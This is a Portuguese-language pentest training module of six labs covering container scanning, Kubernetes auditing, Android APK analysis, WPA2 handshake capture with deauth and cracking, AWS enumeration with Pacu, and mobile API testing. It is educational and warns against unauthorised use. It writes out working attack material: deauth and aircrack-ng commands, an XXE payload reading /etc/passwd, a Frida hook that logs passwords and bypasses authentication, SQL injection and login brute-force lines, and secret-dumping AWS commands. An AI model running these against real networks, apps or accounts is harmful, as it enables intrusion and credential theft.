# 🌐 Módulo 9: Labs de Ambientes Especiais

## Pré-requisitos

| Pré-requisito | Nível | Observação |
|---------------|-------|------------|
| Linux intermediário | ⭐⭐⭐ | Containers, comandos avançados |
| Redes | ⭐⭐ | TCP/IP, DNS, HTTP |
| Docker básico | ⭐⭐ | Imagens, containers, volumes |
| API basics | ⭐ | REST, HTTP methods |
| Conceitos de segurança | ⭐⭐ | OWASP, vulnerabilidades comuns |

---

## Exercício 1: Docker Security com Trivy

**Tempo estimado:** 30 min

**Objetivo:** Escanear imagens Docker e sistemas de arquivos em busca de vulnerabilidades (CVEs) usando o Trivy, implementando segurança em containers.

**Conhecimentos envolvidos:**
- Container security
- CVEs e vulnerabilidades
- Image scanning
- Pipeline de segurança

**Ferramentas:**
- Trivy
- Docker
- apt

**Passo a passo:**

```bash
# 1. Instalar Trivy
sudo apt update && sudo apt install -y wget apt-transport-https
wget -qO - https://aquasecurity.github.io/trivy-repo/deb/public.key | sudo apt-key add -
echo "deb https://aquasecurity.github.io/trivy-repo/deb generic main" | sudo tee /etc/apt/sources.list.d/trivy.list
sudo apt update && sudo apt install -y trivy

# 2. Verificar instalação
trivy --version

# 3. Escanear imagem Docker popular
trivy image nginx:latest

# 4. Escanear com severidade específica
trivy image --severity HIGH,CRITICAL nginx:latest

# 5. Escanear imagem local
docker pull vulnerable-app:latest
trivy image vulnerable-app:latest

# 6. Escanear diretório de código (filesystem)
trivy fs --security-checks vuln,config,misconfig .

# 7. Escanear configuração do Docker
trivy config --security-checks misconfig .

# 8. Gerar relatório em JSON
trivy image -f json -o resultados.json nginx:latest

# 9. Gerar relatório em HTML
trivy image -f template --template "@contrib/html.tpl" -o relatorio.html nginx:latest

# 10. Escanear imagem com ignore file
echo "CVE-2021-12345" > .trivyignore
trivy image --ignorefile .trivyignore nginx:latest

# 11. Verificar licenças
trivy image --license-checks --severity HIGH nginx:latest

# 12. Escanear repositório Git
trivy repo https://github.com/user/repo
```

**Macetes:**
- Filtre por `--severity HIGH,CRITICAL` para focar no importante
- Use `trivy fs` no diretório do projeto antes de buildar
- Crie `.trivyignore` para CVEs aceitos (documente por quê)
- Integre no CI/CD para escaneamento automático
- `--security-checks vuln,config,misconfig` cobre mais áreas
- O Trivy é gratuito e muito eficiente

**Checklist:**
- [ ] Trivy instalado e funcionando
- [ ] Pelo menos 3 imagens Docker escaneadas
- [ ] Escaneamento com filtro de severidade realizado
- [ ] Relatório JSON gerado
- [ ] Filesystem do projeto escaneado
- [ ] Configuração Docker verificada
- [ ] Arquivo .trivyignore criado (se necessário)

**Link de referência:** https://tryhackme.com/room/dockersecurity

---

## Exercício 2: Pentest em Kubernetes

**Tempo estimado:** 45 min

**Objetivo:** Auditar um cluster Kubernetes em busca de falhas de configuração, permissões excessivas e vulnerabilidades de segurança.

**Conhecimentos envolvidos:**
- Kubernetes RBAC
- Secrets management
- Network policies
- Pod security

**Ferramentas:**
- kube-hunter
- kube-bench
- kubectl

**Passo a passo:**

```bash
# 1. Instalar kube-hunter (detector de vulnerabilidades)
pip3 install kube-hunter

# 2. Instalar kube-bench (CIS benchmark)
curl -L https://github.com/aquasecurity/kube-bench/releases/latest/download/kube-bench_linux_amd64.tar.gz | tar xz
sudo mv kube-bench /usr/local/bin/

# 3. Verificar kubectl
kubectl version --client
kubectl cluster-info

# 4. Executar kube-hunter na rede local
sudo kube-hunter --remote 10.0.0.0/24

# 5. Executar kube-hunter localmente
kube-hunter --cidr 10.0.0.0/24

# 6. Rodar kube-bench no nó
sudo kube-bench run

# 7. Rodar kube-bench em todos os nós
sudo kube-bench run --targets master,node

# 8. Verificar configuração do cluster
kubectl get nodes -o wide
kubectl get pods --all-namespaces
kubectl get services --all-namespaces

# 9. Verificar RBAC
kubectl get clusterrolebindings -o yaml
kubectl get rolebindings --all-namespaces -o yaml

# 10. Verificar secrets expostos
kubectl get secrets --all-namespaces
kubectl get secret <nome> -o yaml

# 11. Verificar network policies
kubectl get networkpolicies --all-namespaces

# 12. Verificar pod security
kubectl get pods --all-namespaces -o json | jq '.items[] | {name: .metadata.name, namespace: .metadata.namespace, securityContext: .spec.securityContext}'

# 13. Verificar imagens vulneráveis
kubectl get pods --all-namespaces -o json | jq -r '.items[].spec.containers[].image' | sort -u

# 14. Criar relatório
kube-bench run --json > /tmp/kube-bench-report.json
```

**Macetes:**
- `kube-hunter --active` faz scan mais profundo (cuidado em produção)
- `kube-bench` segue o CIS Kubernetes Benchmark
- Verifique sempre RBAC — é a causa mais comum de problemas
- Secrets em texto plano são vulneráveis
- Network Policies isolam pods maliciosos
- Use `kubectl auth can-i` para testar permissões

**Checklist:**
- [ ] kube-hunter instalado e executado
- [ ] kube-bench instalado e executado
- [ ] Cluster Kubernetes acessível via kubectl
- [ ] Nós e pods mapeados
- [ ] RBAC auditado
- [ ] Secrets verificados
- [ ] Network policies verificadas
- [ ] Pod security analisado
- [ ] Relatório gerado

**Link de referência:** https://tryhackme.com/room/attackinganddefendingkubernetes

---

## Exercício 3: Análise de Malware Android

**Tempo estimado:** 50 min

**Objetivo:** Decompilar e analisar um APK Android para identificar permissões suspeitas, componentes maliciosos e código ofuscado.

**Conhecimentos envolvidos:**
- Android components (Activities, Services, Broadcast Receivers)
- Intents e permissions
- Decompilação
- Análise estática

**Ferramentas:**
- jadx
- apktool
- adb (Android Debug Bridge)

**Passo a passo:**

```bash
# 1. Instalar ferramentas
sudo apt update && sudo apt install -y jadx apktool adb

# 2. Verificar instalações
jadx --version
apktool --version
adb version

# 3. Decompilar APK com jadx
jadx -d ~/analise_android/output/ /caminho/para/app.apk

# 4. Explorar estrutura de diretórios
cd ~/analise_android/output/sources/
find . -name "*.java" | head -20

# 5. Procurar permissões suspeitas
grep -r "INTERNET" ~/analise_android/output/
grep -r "SEND_SMS" ~/analise_android/output/
grep -r "READ_CONTACTS" ~/analise_android/output/
grep -r "CAMERA" ~/analise_android/output/

# 6. Analisar AndroidManifest.xml
cat ~/analise_android/output/resources/AndroidManifest.xml

# 7. Procurar por ofuscação
grep -r "Base64" ~/analise_android/output/sources/
grep -r "Cipher" ~/analise_android/output/sources/
grep -r "getRuntime" ~/analise_android/output/sources/

# 8. Procurar URLs e IPs
grep -r "http" ~/analise_android/output/sources/ | grep -v "import"
grep -rE "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" ~/analise_android/output/

# 9. Decompilar com apktool (recursos)
apktool d /caminho/para/app.apk -o ~/analise_android/apktool_output/

# 10. Verificar smali code
find ~/analise_android/apktool_output/ -name "*.smali" | head -10
cat ~/analise_android/apktool_output/smali/com/example/MainActivity.smali

# 11. Analisar strings
strings /camin/para/app.apk | grep -i "password\|secret\|api_key"

# 12. Verificar assinatura
apksigner verify --verbose /caminho/para/app.apk

# 13. Listar Activities e Services
grep -r "activity\|service\|receiver" ~/analise_android/output/resources/AndroidManifest.xml

# 14. Buscar código suspeito
grep -rn "Runtime.getRuntime" ~/analise_android/output/sources/
grep -rn "ProcessBuilder" ~/analise_android/output/sources/
```

**Macetes:**
- Comece pelo `AndroidManifest.xml` — ele lista todos os componentes
- Permissões como SEND_SMS, READ_CONTACTS, CAMERA são suspeitas em apps simples
- Procure por `Base64.decode` e `Cipher` — indicam ofuscação
- URLs hardcoded podem ser servidores C2
- `jadx` é melhor para código Java; `apktool` para recursos
- Use `strings` para encontrar texto em binários

**Checklist:**
- [ ] jadx e apktool instalados
- [ ] APK decompilado com sucesso
- [ ] AndroidManifest.xml analisado
- [ ] Permissões suspeitas identificadas
- [ ] Pelo menos 2 URLs/IPs encontrados
- [ ] Código ofuscado identificado
- [ ] Activities e Services mapeados
- [ ] Strings suspeitas documentadas

**Link de referência:** https://tryhackme.com/room/androidhacking101

---

## Exercício 4: WiFi Handshake Capture

**Tempo estimado:** 40 min

**Objetivo:** Capturar um handshake WPA2 de rede WiFi e realizar teste de força bruta para quebrar a senha, demonstrando vulnerabilidades de redes sem fio.

**Conhecimentos envolvidos:**
- WPA2 e handshake
- Deauth attack
- Brute force
- Criptografia WiFi

**Ferramentas:**
- airodump-ng
- aircrack-ng
- aireplay-ng

**Passo a passo:**

```bash
# 1. Verificar interface de rede
iwconfig
ip link show

# 2. Habilitar modo monitor
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# 3. Verificar modo monitor
iwconfig wlan0mon

# 4. Escanear redes disponíveis
sudo airodump-ng wlan0mon

# 5. Identificar rede alvo
# Anotar: BSSID (MAC), Canal, Criptografia (WPA2)

# 6. Capturar handshake da rede alvo
sudo airodump-ng -c <CANAL> --bssid <BSSID> -w /tmp/capture wlan0mon

# 7. Em outro terminal, fazer deauth para forçar handshake
sudo aireplay-ng --deauth 10 -a <BSSID> wlan0mon

# 8. Aguardar handshake (aparece "WPA handshake: XX:XX:XX:XX:XX:XX")
# Pressione Ctrl+C quando capturado

# 9. Verificar handshake capturado
ls -la /tmp/capture*.cap
aircrack-ng /tmp/capture-01.cap

# 10. Quebrar senha com brute force
aircrack-ng -w /usr/share/wordlists/rockyou.txt /tmp/capture-01.cap

# 11. Se não tiver rockyou, criar wordlist pequena
echo -e "password\n12345678\nadmin\nwifi123\nsenha123" > /tmp/wordlist.txt
aircrack-ng -w /tmp/wordlist.txt /tmp/capture-01.cap

# 12. Converter cap para outros formatos
airdecap-ng -e <SENHA> /tmp/capture-01.cap

# 13. Verificar pacotes capturados
tcpdump -r /tmp/capture-01.cap | head -20

# 14. Desativar modo monitor
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```

**Macetes:**
- O handshake é capturado quando um cliente reconecta à rede
- Use `--deauth` para forçar reconexão e capturar handshake
- Verifique se apareceu "WPA handshake" no airodump-ng
- `rockyou.txt` é a wordlist mais usada (precisa de 13 caracteres)
- Não execute em redes sem autorização — é ilegal
- Use `airodump-ng` com `--write` para salvar captura

**Checklist:**
- [ ] Interface de rede identificada
- [ ] Modo monitor ativado
- [ ] Redes escaneadas com sucesso
- [ ] Rede alvo identificada (BSSID, canal)
- [ ] Handshake WPA2 capturado
- [ ] Deauth attack executado
- [ ] Handshake verificado com aircrack-ng
- [ ] Brute force testado com wordlist
- [ ] Modo monitor desativado

**Link de referência:** https://tryhackme.com/room/wifihacking101

---

## Exercício 5: AWS Pentesting

**Tempo estimado:** 60 min

**Objetivo:** Enumerar e explorar serviços AWS mal configurados, identificando vulnerabilidades em IAM, S3, EC2 e outros serviços cloud.

**Conhecimentos envolvidos:**
- AWS IAM (Identity and Access Management)
- S3 bucket misconfigurations
- EC2 security groups
- Cloud security

**Ferramentas:**
- AWS CLI
- Pacu
- ScoutSuite

**Passo a passo:**

```bash
# 1. Instalar AWS CLI
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip awscliv2.zip
sudo ./aws/install

# 2. Configurar credenciais (USE ACCOUNT DE TESTE!)
aws configure
# AWS Access Key ID: <sua_chave>
# AWS Secret Access Key: <sua_chave>
# Default region name: us-east-1
# Default output format: json

# 3. Verificar identidade
aws sts get-caller-identity

# 4. ENUMERAR IAM
aws iam list-users
aws iam list-roles
aws iam list-policies --scope Local
aws iam get-account-authorization-details

# 5. Verificar políticas perigosas
aws iam list-attached-role-policies --role-name <role>
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::<account-id>:user/<user> \
  --action-names s3:GetObject s3:PutObject ec2:RunInstances

# 6. ENUMERAR S3
aws s3 ls
aws s3 ls --recursive s3://<bucket-name>/

# 7. Testar acesso a buckets públicos
aws s3api get-bucket-acl --bucket <bucket-name>
aws s3api get-bucket-policy --bucket <bucket-name>
curl -s http://<bucket-name>.s3.amazonaws.com/

# 8. ENUMERAR EC2
aws ec2 describe-instances
aws ec2 describe-security-groups
aws ec2 describe-key-pairs

# 9. Verificar Security Groups abertos
aws ec2 describe-security-groups --filters "Name=ip-permission.cidr,Values=0.0.0.0/0"

# 10. ENUMERAR LAMBDA
aws lambda list-functions
aws lambda get-function --function-name <function-name>

# 11. Verificar secrets no Secrets Manager
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id <secret-id>

# 12. Instalar e usar Pacu (AWS exploitation framework)
pip3 install pacu
pacu
```

```
Pacu> aws_service_enum --force
Pacu> s3_bucket_dump
Pacu> iam_privesc_scan
Pacu> ebs_snapshot_explorer
```

```bash
# 13. Instalar ScoutSuite (auditor multi-cloud)
pip3 install scoutsuite
scout aws --profile default

# 14. Gerar relatório ScoutSuite
# Relatório será gerado em ~/ScoutSuite/output/
```

**Macetes:**
- **NUNCA** use credenciais de produção
- Crie uma conta AWS dedicada para pentest
- S3 públicos são a vulnerabilidade mais comum
- Verifique Security Groups com 0.0.0.0/0
- IAM permissões excessivas = risco de escalação
- Pacu automatiza muitas verificações
- ScoutSuite gera relatórios visuais detalhados

**Checklist:**
- [ ] AWS CLI instalado e configurado
- [ ] Identidade AWS verificada
- [ ] IAM enumerado (users, roles, policies)
- [ ] S3 buckets listados e testados
- [ ] EC2 instances mapeadas
- [ ] Security Groups auditados
- [ ] Lambda functions verificadas
- [ ] Secrets Manager verificado
- [ ] Pacu utilizado para exploração
- [ ] ScoutSuite relatório gerado
- [ ] Vulnerabilidades documentadas

**Link de referência:** https://tryhackme.com/room/awsfundamentals

---

## Exercício 6: Pentest Mobile API (Final Challenge)

**Tempo estimado:** 90 min

**Objetivo:** Testar a API de um aplicativo mobile para vulnerabilidades de segurança, incluindo interceptação de tráfego, teste de autorização e exploração de falhas.

**Conhecimentos envolvidos:**
- API security (OWASP API Top 10)
- Mobile traffic interception
- Proxy setup
- Authorization testing

**Ferramentas:**
- Burp Suite
- MobSF
- Frida

**Passo a passo:**

```bash
# 1. Instalar MobSF (Mobile Security Framework)
git clone https://github.com/MobileSecurityFramework/MobSF.git
cd MobSF
pip3 install -r requirements.txt
python3 manage.py runserver

# 2. Acessar MobSF
# http://localhost:8000

# 3. Fazer upload do APK
# Na interface: Upload & Analyze → selecionar APK

# 4. Analisar relatório MobSF
# Verificar: permissões, components, vulnerabilidades, APIs

# --- CONFIGURAR BURP SUITE ---

# 5. Iniciar Burp Suite
# Proxy → Options → Proxy Listeners
# Adicionar: 127.0.0.1:8080

# 6. Configurar proxy no celular
# WiFi → Proxy → Manual
# Host: [IP_DO_COMPUTADOR]
# Port: 8080

# 7. Instalar certificado CA do Burp
# Acessar http://burp no celular
# Baixar e instalar certificado

# --- INTERCEPTAÇÃO ---

# 8. Habilitar interceptação
# Proxy → Intercept → Intercept is on

# 9. Abrir app e capturar requests
# Verificar: URLs, headers, body, tokens

# 10. Analisar endpoints da API
# Target → Site map
# Identificar todas as rotas da API

# --- TESTES DE VULNERABILIDADE ---

# 11. Testar BOLA (Broken Object Level Authorization)
# Modificar ID de objeto em request
# GET /api/users/123 → GET /api/users/124
# Verificar se acessa dados de outro usuário

# 12. Testar Broken Authentication
# Manipular tokens JWT
# jwt_tool token.txt -T
# Testar: None algorithm, key confusion

# 13. Testar Rate Limiting
# Enviar many requests rapidamente
# for i in {1..100}; do curl -X POST http://api/login -d "user=admin&pass=test"; done

# 14. Testar Mass Assignment
# Adicionar campos extras no request
# {"user": "admin", "role": "admin"}

# 15. Testar SQL Injection
# Inserir ' OR 1=1 -- em campos
# Usar sqlmap: sqlmap -u "http://api/users?id=1" --batch

# 16. Testar XXE
# Enviar XML com entidade externa
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>&xxe;</user>
```

```bash
# 17. Usar Frida para hooking em runtime
pip3 install frida-tools
frida -U -f com.app.target -l hook_script.js
```

```javascript
// hook_script.js
Java.perform(function() {
    var login = Java.use("com.app.api.LoginActivity");
    login.verifyPassword.implementation = function(password) {
        console.log("Password: " + password);
        return true; // Bypass autenticação
    };
});
```

```bash
# 18. Documentar vulnerabilidades encontradas
cat > /tmp/relatorio_mobile_pentest.md << EOF
# RELATÓRIO MOBILE API PENTEST

## Data: $(date)
## Aplicativo: [Nome]
## Versão: [Versão]

## Vulnerabilidades Encontradas

### 1. BOLA (OWASP API1)
- Endpoint: GET /api/users/{id}
- Impacto: Acesso a dados de outros usuários
- PoC: Modificar ID no request
- Severidade: HIGH

### 2. Broken Authentication (OWASP API2)
- Endpoint: POST /api/login
- Impacto: Bypass de autenticação
- PoC: JWT None algorithm
- Severidade: CRITICAL

### 3. Mass Assignment (OWASP API6)
- Endpoint: POST /api/register
- Impacto: Escalação de privilégios
- PoC: Adicionar "role":"admin"
- Severidade: HIGH

## Recomendações
1. Implementar autorização por objeto
2. Validar tokens JWT corretamente
3. Whitelist de campos aceitos
4. Rate limiting em todos os endpoints
5. Input validation completa
EOF

echo "Relatório gerado: /tmp/relatorio_mobile_pentest.md"
```

**Macetes:**
- MobSF faz análise estática automática — comece por ele
- Burp Suite é essencial para interceptação e manipulação de requests
- Teste sempre BOLA — é a vulnerabilidade #1 em APIs
- JWTs são vulneráveis a manyos ataques (none algorithm, key confusion)
- Use `sqlmap` para automatizar testes de SQL injection
- Frida permite hooking em runtime (avançado)
- Documente cada vulnerabilidade com PoC

**Checklist:**
- [ ] MobSF instalado e APK analisado
- [ ] Burp Suite configurado e proxy funcionando
- [ ] Certificado CA instalado no celular
- [ ] Pelo menos 5 endpoints da API mapeados
- [ ] BOLA testado
- [ ] Broken Authentication testado
- [ ] Rate Limiting verificado
- [ ] Mass Assignment testado
- [ ] SQL Injection testado
- [ ] Pelo menos 3 vulnerabilidades documentadas
- [ ] Relatório de pentest gerado
- [ ] Recomendações documentadas

**Link de referência:** https://tryhackme.com/room/androidhacking101
